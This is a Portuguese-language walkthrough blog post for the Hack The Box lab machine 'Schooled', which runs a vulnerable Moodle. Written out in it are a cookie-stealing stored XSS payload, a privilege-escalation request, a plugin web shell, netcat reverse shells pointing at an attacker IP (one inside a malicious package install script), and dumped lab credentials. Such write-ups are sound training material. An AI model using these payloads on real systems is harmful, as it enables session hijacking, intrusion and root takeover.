---
title: 'Walktrough: HTB Schooled'
namespace: htb-schooled
language: pt-BR
category: Walkthrough
tags:
- HTB Linux
- HTB Medium
- HackTheBox
header:
  teaser: https://i.imgur.com/ksBoJIQ.png
  og_image: https://i.imgur.com/ksBoJIQ.png
---

Olá pessoal!

A máquina desta semana será **Schooled**, outra máquina Linux classificada como mediana do [Hack The Box](https://www.hackthebox.eu/), criada por [TheCyberGeek](https://app.hackthebox.eu/users/114053).<!--more-->

:information_source: **Info**: Write-ups para máquinas do Hack The Box são postados assim que as máquinas são aposentadas.
{: .notice--info}

![HTB Schooled](https://i.imgur.com/qw8zycI.png){: .align-center}

Para resolver esta máquina, precisei explorar dois CVEs de uma versão vulnerável do Moodle, que foi a parte mais difícil do processo, uma vez que a PoC das vulnerabilidades não funcionaram corretamente e demorei um pouco para entender exatamente os passos necessários e executá-los manualmente para obter o acesso inicial. Após isso, tudo foi bem tranquilo, onde as credenciais do banco de dados foram obtidas e, na sequencia, abusei de instruções super permissivas de `sudo`.

Espero que gostem!

## Enumeração

Como de costume, iniciei por executar um scan rápido com o `nmap` para listar os serviços atualmente publicados.

```bash
$ nmap -sC -sV -Pn -oA quick 10.10.10.234
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-01 14:41 -03
Nmap scan report for 10.10.10.234
Host is up (0.077s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9 (FreeBSD 20200214; protocol 2.0)
| ssh-hostkey:
|   2048 1d:69:83:78:fc:91:f8:19:c8:75:a7:1e:76:45:05:dc (RSA)
|   256 e9:b2:d2:23:9d:cf:0e:63:e0:6d:b9:b1:a6:86:93:38 (ECDSA)
|_  256 7f:51:88:f7:3c:dd:77:5e:ba:25:4d:4c:09:25:ea:1f (ED25519)
80/tcp open  http    Apache httpd 2.4.46 ((FreeBSD) PHP/7.4.15)
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.46 (FreeBSD) PHP/7.4.15
|_http-title: Schooled - A new kind of educational institute
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.06 seconds
```

Em paralelo, iniciei outro scan, para validar todas as portas TCP abertas, onde encontrei também a porta 33060/TCP, resultando no output final dos seguintes serviços:

```bash
$ nmap -p 80,33060 -A -oA Full 10.10.10.234                                                                                     
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-01 14:57 -03
Nmap scan report for schooled.htb (10.10.10.234)
Host is up (0.077s latency).

PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.46 ((FreeBSD) PHP/7.4.15)
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.46 (FreeBSD) PHP/7.4.15
|_http-title: Schooled - A new kind of educational institute
33060/tcp open  mysqlx?
| fingerprint-strings:
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp:
|     Invalid message"
|     HY000
|   LDAPBindReq:
|     *Parse error unserializing protobuf message"
|     HY000
|   oracle-tns:
|     Invalid message-frame."
|_    HY000
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port33060-TCP:V=7.91%I=7%D=8/1%Time=6106E084%P=x86_64-pc-linux-gnu%r(NU
SF:LL,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(GenericLines,9,"\x05\0\0\0\x0b\x
SF:08\x05\x1a\0")%r(GetRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(HTTPOpt
SF:ions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(RTSPRequest,9,"\x05\0\0\0\x0b\
SF:x08\x05\x1a\0")%r(RPCCheck,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSVersi
SF:onBindReqTCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSStatusRequestTCP,2B
SF:,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fIn
SF:valid\x20message\"\x05HY000")%r(Help,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%
SF:r(SSLSessionReq,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\
SF:x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(TerminalServerCookie,
SF:9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TLSSessionReq,2B,"\x05\0\0\0\x0b\x0
SF:8\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\
SF:x05HY000")%r(Kerberos,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SMBProgNeg,9,
SF:"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(X11Probe,2B,"\x05\0\0\0\x0b\x08\x05\x
SF:1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY00
SF:0")%r(FourOhFourRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LPDString,9
SF:,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LDAPSearchReq,2B,"\x05\0\0\0\x0b\x08
SF:\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x
SF:05HY000")%r(LDAPBindReq,46,"\x05\0\0\0\x0b\x08\x05\x1a\x009\0\0\0\x01\x
SF:08\x01\x10\x88'\x1a\*Parse\x20error\x20unserializing\x20protobuf\x20mes
SF:sage\"\x05HY000")%r(SIPOptions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LAND
SF:esk-RC,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TerminalServer,9,"\x05\0\0\0
SF:\x0b\x08\x05\x1a\0")%r(NCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(NotesRPC
SF:,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0
SF:fInvalid\x20message\"\x05HY000")%r(JavaRMI,9,"\x05\0\0\0\x0b\x08\x05\x1
SF:a\0")%r(WMSRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(oracle-tns,32,"\
SF:x05\0\0\0\x0b\x08\x05\x1a\0%\0\0\0\x01\x08\x01\x10\x88'\x1a\x16Invalid\
SF:x20message-frame\.\"\x05HY000")%r(ms-sql-s,9,"\x05\0\0\0\x0b\x08\x05\x1
SF:a\0")%r(afp,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\
SF:x88'\x1a\x0fInvalid\x20message\"\x05HY000");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.96 seconds
```

### 80/TCP - Serviço HTTP

Acessando a página inicial, podemos ver um site institucional de uma escola, que também menciona que todo o seu conteúdo é entregue através da plataforma **Moodle**, que eventualmente teremos acesso e precisaremos buscar por ela eventualmente.

![HTB Schooled - Institutional Page](https://i.imgur.com/hy0QFcA.png){: .align-center}

Também, executando o `whatweb`, encontrei a conta de e-mail **admissions@schooled.htb** onde o dominicio `schooled.htb` deve ser o utilizado pela organização, o qual foi adicionado ao arquivo hosts local.

```bash
$ whatweb --color=never -a 3 10.10.10.234
http://10.10.10.234 [200 OK] Apache[2.4.46], Bootstrap[4.1.0], Country[RESERVED][ZZ], Email[#,admissions@schooled.htb], HTML5, HTTPServer[FreeBSD][Apache/2.4.46 (FreeBSD) PHP/7.4.15], IP[10.10.10.234], PHP[7.4.15], Script, Title[Schooled - A new kind of educational institute], X-UA-Compatible[IE=edge]
```

Enquanto deixei o `gobuster dir` executando em background para enumerar páginas e eventuais diretórios nessa máquina, uma vez que vi que nada estava sendo retornado, decidi iniciar uma instancia de enumeração de subdomínios, onde os domínios **moodle** e **student** foram encontrados, também adicionados no arquivo hosts local.

```bash
$ gobuster dns -d schooled.htb -w /usr/share/dnsrecon/subdomains-top1mil-5000.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Domain:     schooled.htb
[+] Threads:    10
[+] Timeout:    1s
[+] Wordlist:   /usr/share/dnsrecon/subdomains-top1mil-5000.txt
===============================================================
2021/08/01 17:24:31 Starting gobuster in DNS enumeration mode
===============================================================
Found: moodle.schooled.htb
Found: student.schooled.htb

===============================================================
2021/08/01 17:25:04 Finished
===============================================================
```

O subdomínio `student.schooled.htb` estava redirecionando para a página principal, porém o subdomínio `moodle.schooled.htb` nos redirecionou para a página abaixo, que consiste em um site Moodle que vimos sendo mencionado anteriormente e através do qual poderemos obter algum tipo de acesso se este possuir alguma vulnerabilidade não corrigida.

![HTB Schooled - Moodle](https://i.imgur.com/Sx32BwP.png){: .align-center}

Iniciando a enumeração do site Moodle, utilizei o script [moodlescan](https://github.com/inc0d3/moodlescan) que simplifica este processo, onde pude obter a versão em execução da plataforma que é **3.9.0-beta**, segundo output abaixo:

```bash
$ python3 moodlescan.py -u http://moodle.schooled.htb/moodle

Version 0.8 - May/2021
.............................................................................................................

By Victor Herrera - supported by www.incode.cl

.............................................................................................................

Getting server information http://moodle.schooled.htb/moodle ...

server          : Apache/2.4.46 (FreeBSD) PHP/7.4.15
x-powered-by    : PHP/7.4.15
x-frame-options : sameorigin
last-modified   : Mon, 02 Aug 2021 11:54:53 GMT

Getting moodle version...

Version found via /admin/tool/lp/tests/behat/course_competencies.feature : Moodle v3.9.0-beta

Searching vulnerabilities...


Vulnerabilities found: 0

Scan completed.
```

Validando esta versão, pude notar que existem diversas vulnerabilidades conhecidas porém todas elas requerem privilégios que ainda não temos. Decidi então seguir tentando criar uma conta na plataforma e ver se consigo obter alguma informação interessante, considerando que nada estava aberto para usuários acessando o portal como visitante.

Enquanto criava a conta, notei que existe um requisito de utilizar um e-mail do subdomínio **student.schooled.htb**, previamente enumerado utilizando o `gobuster`.

Mesmo havendo o requisito, nenhum tipo de validação foi necessária e, ao navegar no portal, a única turma que consegui fazer o auto-assinalamento foi a turma de Matemática, que continua o seguinte anúncio:

> Reminder for joining students
> by Manuel Phillips - Wednesday, 23 December 2020, 12:01 AM
> Number of replies: 0
> This is a self enrollment course. For students who wish to attend my lectures be sure that you have your MoodleNet profile set.
>
> Students who do not set their MoodleNet profiles will be removed from the course before the course is due to start and I will be checking all students who are enrolled on this course.
>
> Look forward to seeing you all soon.
>
> Manuel Phillips

Isso significa que o professor Manuel Philips verificará todos os perfis MoodleNet dos alunos que se inscreveram na matéria e, caso possamos armazenar um XSS neste atributo, poderemos utilizar deste artifício para roubar a sessão do professor a partir dos atributos do cabeçalho da requisição. Com acesso na plataforma, dependendo dos privilégios do professor, podemos buscar por uma oportunidade de RCE.

## Acesso inicial

Buscando por **MoodleNet XSS**, encontrei este [Security Announcement](https://moodle.org/mod/forum/discuss.php?d=410839) que menciona o **CVE-2020-25627**, corrigido apenas na versão 3..9.2 e afeta as versões 3.9 e 3.9.1, que coincide com nosso cenário.

Buscando por uma prova de conceito (PoC) para este CVE, encontrei o repositório [HoangKien1020/CVE-2020-25627: Stored XSS via moodlenetprofile parameter in user profile (github.com)](https://github.com/HoangKien1020/CVE-2020-25627) que contém as instruções para exploração, que foram implementadas e me permitiram obter o cookie da sessão do professor, conforme evidencia abaixo:

* Loguei com a conta recentemente criada e modifiquei o MoodleNet profile para o conteúdo abaixo

```html
<script>var i=new Image;i.src="http://10.10.10.10/xss.php?"+document.cookie;</script>
```

* Hospedei o arquivo `xss.php` mencionado no repositório em uma pasta e iniciei um PHP Webserver com os comandos abaixo e, cerca de 2 minutos depois, comecei a receber as requisições da conta do professor, nos mostrando os cookies utilizados por ele.

```bash
$ sudo php -S 0.0.0.0:80 -t .
[Mon Aug  9 14:44:05 2021] PHP 7.4.21 Development Server (http://0.0.0.0:80) started
[Mon Aug  9 14:45:28 2021] 10.10.10.234:55102 Accepted
[Mon Aug  9 14:45:28 2021] PHP Notice:  Undefined index: METHOD in /opt/dcruz/htb/schooled-10.10.10.234/exploit/www/xss.php on line 28
[Mon Aug  9 14:45:28 2021] PHP Notice:  Undefined index: REMOTE_HOST in /opt/dcruz/htb/schooled-10.10.10.234/exploit/www/xss.php on line 29
[Mon Aug  9 14:45:28 2021] 10.10.10.234:55102 [200]: GET /xss.php?MoodleSession=d8so1t4rs4vmg8btrgfr2ps6fr
[Mon Aug  9 14:45:28 2021] 10.10.10.234:55102 Closing

```

Agora sabendo quais os parametros da sessão do professor, alterei o valor do cookie no meu navegador e, após atualizar a página, pude observar que a conta agora é listada como a do professor Manuel Philips.

![HTB Schooled - Moodle as Manuel Philips](https://i.imgur.com/n3plh19.png){: .align-center}

Agora que temos acesso a outra conta, necessitamos validar se as permissões possuidas por este usuário são suficientes para dar continuidade na exploração, vindo a obter um RCE.

Pesquisando sobre explorações em Moodle em [Moodle - HackTricks](https://book.hacktricks.xyz/pentesting/pentesting-web/moodle#rce), encontrei qeu é necessário o privilégio de *manager* para realizar o upload de um plugin, método mais eficiente para obter execução de código via aplicação. Mesmo não tendo esta permissão com o usuário do professor, observado que esta versão em execução **também é vulnerável à** [**Escalação de privilégio**](https://moodle.org/mod/forum/discuss.php?d=407393), que poderia nos permitir obter o acesso de manager a partir do curso abusando o processo de inscrição e, se um dos estudantes for um dos *site managers*, este privilégio poderia ser explorado para a finalidade desejada, que é realizar o upload de um plugin malicioso. O mesmo autor da PoC do outro CVE também possui [um repositório no Github](https://github.com/HoangKien1020/CVE-2020-14321) contendo uma PoC que poderia nos auxiliar nesta tarefa.

Mesmo não funcionando adequadamente a PoC em nosso cenário, após entender exatamente os passos necessários, foi possível obter execução de código na máquina, conforme passos abaixo:

* Primeiro foi necessário identificar qual usuário na plataforma poderia ter o privilégio de manager. Com base nas informações obtidas a partire de reconhecimento do site institucional, **Lianne Carter** é a gerente da escola e provavelmente possui os privilégios dos quais precisamos.

* Também tomei nota sobre o Profile ID do usuário **Manuel Philips**, que foi obtido ao navegar à sua página no link  `http://moodle.schooled.htb/moodle/user/profile.php?id=24`.

* A exploração iniciou-se por fazer a inscrição da gerente da escola na turma de matemática e, interceptando a requisição utilizando o Burp Suite, enviei a mesma ao Repeater e, além da requisição inicial, fiz uma nova para nos conceder o priviégio de Manager no curso, por atribuir o valor `roleid=1` e substituir o ID do usuário pelo identificado previamente, conforme visto no video no repositório.

```http
GET /moodle/enrol/manual/ajax.php?mform_showmore_main=0&id=5&action=enrol&enrolid=10&sesskey=KbJYqTapFc&_qf__enrol_manual_enrol_users_form=1&mform_showmore_id_main=0&userlist%5B%5D=24&roletoassign=1&startdate=4&duration= HTTP/1.1
Host: moodle.schooled.htb
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
Content-Type: application/json
Referer: http://moodle.schooled.htb/moodle/user/index.php?id=5
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: MoodleSession=jil2s8i0vj0gq3vojfki6e7rtq
Connection: close
```

* Agora como um Administrador do curso, acessando um perfil de usuário podemos utilizar a função "Log in as", que nos permitiu acessar a plataforma como o usuário Lianne Carter.

  ![HTB Schooled - Impersonating Manager in Moodle](https://i.imgur.com/zRjimbq.png){: .align-center}
  
* Agora como Lianne, deveríamos ter privilégios de realizar o upload do plugin diretamente, uma vez que a opção "Site Administration" é exibida à esquerda, porém tais privilégios não são habilitados por padrão. Para tal atividade, precisamos editar a role acessando o menu "Site Administration" > "Users" e, na aba "Permissions", selecionei "Define Roles".

  ![HTB Schooled - Adjusting Role Definitions](https://i.imgur.com/6XmydvH.png)
  
* Selecionei a role **Manager** e, clicando no botão "Edit", interceptei a requisição e substitui o dado enviado pelo encontrado no repositório, qeu me concederia privilégios totais na aplicação.

  ![HTB Schooled - Modifying Manager role](https://i.imgur.com/lm0NOX7.png){: .align-center}

  ![HTB Schooled - Appending payload to Edit Request](https://i.imgur.com/5L28UqN.png){: .align-center}
  
* Agora, navegando em "Site Administration" > "Plugins" podemos ver a opção para instalação, para o qual o arquivo `rce.zip`, também disponibilizado no portal, foi carregado, nos permitindo executar comandos remotamente e obter um shell reverso a partir de chamadas na URL do plugin, conforme abaixo:

```bash
$ curl -X GET -G 'http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php' --data-urlencode 'cmd=id'
uid=80(www) gid=80(www) groups=80(www)

$ curl -X GET -G 'http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php' --data-urlencode 'cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc "10.10.10.10" 4443 >/tmp/f'
```

## User Flag

Agora com um shell interativo com a conta `www-data`, iniciei a enumeração da máquina. Como de costume, iniciei com a execução do `linpeas.sh` mas descobri que `wget` e `curl` não estavam disponível, então escrevi um simples script php para baixar os arquivos dos quais precisava.

```bash
echo "<?php" > wget.php
echo "\$url = 'http://10.10.10.10/linpeas.sh';" >> wget.php
echo "\$file = '/tmp/linpeas.sh';" >> wget.php
echo "\$current = file_get_contents(\$url);" >> wget.php
echo "file_put_contents(\$file, \$current);" >> wget.php
echo "?>" >> wget.php

/usr/local/bin/php wget.php
```

A partir da execução, a seguintes informações foram obtidas:

* Usuários com console e suas permissões:

```plaintext
jamie:*:1001:1001:Jamie:/home/jamie:/bin/sh
root:*:0:0:Charlie &:/root:/bin/csh
steve:*:1002:1002:User &:/home/steve:/bin/csh
```

* Senha para o banco de dados do Moodle no arquivo `/usr/local/www/apache24/data/moodle/config.php` :

```plaintext
$CFG->dbtype    = 'mysqli';
$CFG->dbhost    = 'localhost';
$CFG->dbuser    = 'moodle';
$CFG->dbpass    = 'PlaybookMaster2020';
'dbport' => 3306,
```

Logo após executar a enumeração, descobri que apenas nos faltava alguns caminhos no PATH, encontrando o binário do `curl`. Este ajuste no PATH também foi necessário para executar o comando `mysql`, necessário para que pudesse realizar o dump das informações necessárias a partir do banco de dados. Esta atividade foi feita de forma não interativa, já que não consegui promover meu shell para um TTY.

```bash
$ find / -type f 2>/dev/null | grep -e "wget$" -e "curl$" -e "mysql$"
/usr/local/bin/curl
/usr/local/bin/mysql
/usr/local/share/bash-completion/completions/wget
/usr/local/share/bash-completion/completions/curl
/usr/local/share/bash-completion/completions/mysql
/usr/local/share/zsh/site-functions/_curl
/var/mail/mysql
```

O dump das credenciais foi possível a partir do comando abaixo:

```bash
$ /usr/local/bin/mysql -u moodle --password=PlaybookMaster2020 -e "use moodle; select email,username,password from mdl_user; exit" | grep -v 'student.'
mysql: [Warning] Using a password on the command line interface can be insecure.
ERROR 1064 (42000) at line 1: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'exit' at line 1
email   username        password
root@localhost  guest   $2y$10$u8DkSWjhZnQhBk1a0g1ug.x79uhkx/sa7euU8TI4FX4TCaXK6uQk2
jamie@staff.schooled.htb        admin   $2y$10$3D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW
higgins_jane@staff.schooled.htb higgins_jane    $2y$10$n9SrsMwmiU.egHN60RleAOauTK2XShvjsCS0tAR6m54hR1Bba6ni2
phillips_manuel@staff.schooled.htb      phillips_manuel $2y$10$ZwxEs65Q0gO8rN8zpVGU2eYDvAoVmWYYEhHBPovIHr8HZGBvEYEYG
carter_lianne@staff.schooled.htb        carter_lianne   $2y$10$jw.KgN/SIpG2MAKvW8qdiub67JD7STqIER1VeRvAH4fs/DPF57JZe
```

Com base nos hashes, criei um arquivo no formato `username:hash` e executei o comando `john`, onde obtive a senha para o usuário `jamie` conforme output abaixo:

```bash
$ john --wordlist=/usr/share/wordlists/rockyou.txt accounts.txt                                                                 Using default input encoding: UTF-8
Loaded 5 password hashes with 5 different salts (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
!QAZ2wsx         (jamie)
Use the "--show" option to display all of the cracked passwords reliably
Session aborted
```

Com estas credenciais, consegui me logar via SSH e obter a flag no arquivo `user.txt` :smile:

```bash
jamie@Schooled:~ $ id && hostname && cat user.txt
uid=1001(jamie) gid=1001(jamie) groups=1001(jamie),0(wheel)
Schooled
<redacted>
```

## Root Flag

Antes de iniciar a enumeração, iniciei executando o comando `sudo -l` como de costume, onde pude identificar as seguintes permissões para o usuário como root:

```bash
jamie@Schooled:~ $ sudo -l
User jamie may run the following commands on Schooled:
    (ALL) NOPASSWD: /usr/sbin/pkg update
    (ALL) NOPASSWD: /usr/sbin/pkg install *
```

Verificando a página do binário `pkg` no [GTFOBins](https://gtfobins.github.io/gtfobins/pkg/) descobri que poderia utilizá-lo para instalar um pacote malicioso, de modo a conseguir um shell reverso nesta máquina. Os passos abaixo foram executados para obter um shell como `root`

* Instalei o pacote `fpm` na máquina atacante, também disponivel a partir deste [repositório no Github](https://github.com/jordansissel/fpm)

```bash
sudo apt-get install ruby ruby-dev rubygems build-essential
sudo gem install --no-document fpm
```

* Criei um pacote contendo o payload malicioso, no caso destinado a executar o comando para obtenção de um shell reverso

```bash
TF=$(mktemp -d)
echo 'export file="/tmp/zurc"' > $TF/x.sh
echo 'rm $file;mkfifo $file;cat $file|/bin/sh -i 2>&1|nc 10.10.10.10 4443 >$file' >> $TF/x.sh
fpm -n x -s dir -t freebsd -a all --before-install $TF/x.sh $TF
```

* Transferi o pacote para a máquina alvo e executei o comando `sudo` permitido, obtendo assim um shell reverso a partir da conta do `jamie`, podendo assim ler a flag de root

```bash
jamie@Schooled:/tmp $ /usr/local/bin/curl http://10.10.10.10/x-1.0.txz -o x-1.0.txz
1.0.txz  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                  Dload  Upload   Total   Spent    Left  Speed
100   572  100   572    0     0   4144      0 --:--:-- --:--:-- --:--:--  4144
jamie@Schooled:/tmp $ sudo pkg install -y --no-repo-update ./x-1.0.txz
pkg: Repository FreeBSD has a wrong packagesite, need to re-create database
pkg: Repository FreeBSD cannot be opened. 'pkg update' required
Checking integrity... done (0 conflicting)
The following 1 package(s) will be affected (of 0 checked):

New packages to be INSTALLED:
        x: 1.0

Number of packages to be installed: 1
[1/1] Installing x-1.0...
rm: /tmp/zurc: No such file or directory
```

```bash
$ nc -lnvp 4443
listening on [any] 4443 ...
connect to [10.10.10.10] from (UNKNOWN) [10.10.10.234] 16349
# cd /root
# cat root.txt
<redacted>
```

Espero que tenham gostado!

Vejo vocês no próximo post :smile:
